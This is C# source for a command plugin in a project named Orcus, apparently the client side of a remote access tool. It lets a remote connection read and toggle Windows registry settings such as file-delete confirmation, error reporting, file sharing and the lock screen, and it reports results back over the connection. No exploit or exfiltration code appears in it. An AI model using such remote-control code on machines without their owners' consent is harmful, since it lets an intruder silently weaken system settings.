using System;
using System.Collections.Generic;
using System.Linq.Expressions;
using System.Text;
using Microsoft.Win32;
using Orcus.Commands.WindowsCustomizer.Core;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowsCustomizer;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.WindowsCustomizer
{
    public class WindowsCustomizerCommand : Command
    {
        private Dictionary<string, IWindowsPropertyInfo> _windowsPropertyInfos;

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            Initialize();

            switch ((WindowsCustomizerCommunication) parameter[0])
            {
                case WindowsCustomizerCommunication.GetCurrentSettings:
                    ResponseBytes((byte) WindowsCustomizerCommunication.ResponseCurrentSettings,
                        new Serializer(typeof (CurrentSettings)).Serialize(GetCurrentSettings()), connectionInfo);
                    break;
                case WindowsCustomizerCommunication.ChangeBooleanValue:
                    var booleanValue = parameter[1] == 1;
                    var propertyName = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);

                    var propertyInfo = _windowsPropertyInfos[propertyName];

                    try
                    {
                        propertyInfo.Value = booleanValue;
                    }
                    catch (Exception ex)
                    {
                        if (!(ex is UnauthorizedAccessException) && !(ex.InnerException is UnauthorizedAccessException))
                            throw;

                        var exceptionData = new byte[parameter.Length];
                        exceptionData[0] = (byte) WindowsCustomizerCommunication.UnauthorizedAccessException;
                        Array.Copy(parameter, 1, exceptionData, 1, parameter.Length - 1);
                        connectionInfo.CommandResponse(this, exceptionData);
                        return;
                    }

                    var data = new byte[parameter.Length];
                    data[0] = (byte) WindowsCustomizerCommunication.BooleanValueChanged;
                    Array.Copy(parameter, 1, data, 1, parameter.Length - 1);
                    connectionInfo.CommandResponse(this, data);
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        private CurrentSettings GetCurrentSettings()
        {
            var result = new CurrentSettings();
            foreach (var windowsPropertyInfo in _windowsPropertyInfos)
            {
                var propertyInfo = typeof (CurrentSettings).GetProperty(windowsPropertyInfo.Key);
                propertyInfo.SetValue(result, windowsPropertyInfo.Value.Value, null);
            }

            result.IsWindows10Enabled = IsWindows10();
            return result;
        }

        private bool IsWindows10()
        {
            return
                RegistryUtilities.GetIntValueSafe(
                    Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false),
                    "CurrentMajorVersionNumber") == 10;
        }

        private void Initialize()
        {
            if (_windowsPropertyInfos != null)
                return;

            _windowsPropertyInfos = new Dictionary<string, IWindowsPropertyInfo>();

            //General
            SetupProperty(() => General.GodMode, nameof(CurrentSettings.GodMode));
            SetupProperty(() => General.ConfirmFileDelete, nameof(CurrentSettings.ConfirmFileDelete));
            SetupProperty(() => General.AutoRebootWithLoggedOnUsers, nameof(CurrentSettings.AutoRebootWithLoggedOnUsers));
            SetupProperty(() => General.EnableAUAsDefaultShutdownOption, nameof(CurrentSettings.EnableAUAsDefaultShutdownOption));
            SetupProperty(() => General.EnableWinKeys, nameof(CurrentSettings.EnableWinKeys));
            SetupProperty(() => General.EnableInternetOpenWith, nameof(CurrentSettings.EnableInternetOpenWith));
            SetupProperty(() => General.AutoReboot, nameof(CurrentSettings.AutoReboot));
            SetupProperty(() => General.DoErrorReport, nameof(CurrentSettings.DoErrorReport));
            SetupProperty(() => General.FilePrintSharing, nameof(CurrentSettings.FilePrintSharing));
            SetupProperty(() => General.KernelPaging, nameof(CurrentSettings.KernelPaging));
            SetupProperty(() => General.ClearPageFile, nameof(CurrentSettings.ClearPageFile));
            SetupProperty(() => General.BootDefragmentation, nameof(CurrentSettings.BootDefragmentation));
            SetupProperty(() => General.ReserveBandwidthForSystem, nameof(CurrentSettings.ReserveBandwidthForSystem));
            SetupProperty(() => General.VerboseLogging, nameof(CurrentSettings.VerboseLogging));
            SetupProperty(() => General.SeparateExplorerProcess, nameof(CurrentSettings.SeparateExplorerProcess));
            SetupProperty(() => General.CrashOnCtrlScroll, nameof(CurrentSettings.CrashOnCtrlScroll));
            SetupProperty(() => General.MobilityCenter, nameof(CurrentSettings.MobilityCenter));

            //Desktop
            SetupProperty(() => DesktopProperties.DisplayWindowsVersion, nameof(CurrentSettings.DisplayWindowsVersion));
            SetupProperty(() => DesktopProperties.DisplayTrayItems, nameof(CurrentSettings.DisplayTrayItems));
            SetupProperty(() => DesktopProperties.WindowAnimation, nameof(CurrentSettings.WindowAnimation));
            SetupProperty(() => DesktopProperties.AeroShake, nameof(CurrentSettings.AeroShake));
            SetupProperty(() => DesktopProperties.WindowSnap, nameof(CurrentSettings.WindowSnap));
            SetupProperty(() => DesktopProperties.NotificationBalloons, nameof(CurrentSettings.NotificationBalloons));
            SetupProperty(() => DesktopProperties.LibrariesOnDesktop, nameof(CurrentSettings.LibrariesOnDesktop));
            SetupProperty(() => DesktopProperties.RecycleBinOnComputer, nameof(CurrentSettings.RecycleBinOnComputer));
            SetupProperty(() => DesktopProperties.DesktopPreview, nameof(CurrentSettings.DesktopPreview));
            SetupProperty(() => DesktopProperties.ExplorerCheckBoxSelection, nameof(CurrentSettings.ExplorerCheckBoxSelection));

            //Windows 10
            SetupProperty(() => Windows10.LockScreen, nameof(CurrentSettings.LockScreen));
            SetupProperty(() => Windows10.DarkTheme, nameof(CurrentSettings.DarkTheme));
            SetupProperty(() => Windows10.BalloonNotifications, nameof(CurrentSettings.BalloonNotifications));
            SetupProperty(() => Windows10.ActionCenter, nameof(CurrentSettings.ActionCenter));
            SetupProperty(() => Windows10.ClassicVolumeMixer, nameof(CurrentSettings.ClassicVolumeMixer));
        }

        private void SetupProperty<T>(Expression<Func<T>> picker, string currentSettingsPropertyName)
        {
            _windowsPropertyInfos.Add(currentSettingsPropertyName, new WindowsPropertyInfo<T>(picker));
        }

        protected override uint GetId()
        {
            return 27;
        }
    }
}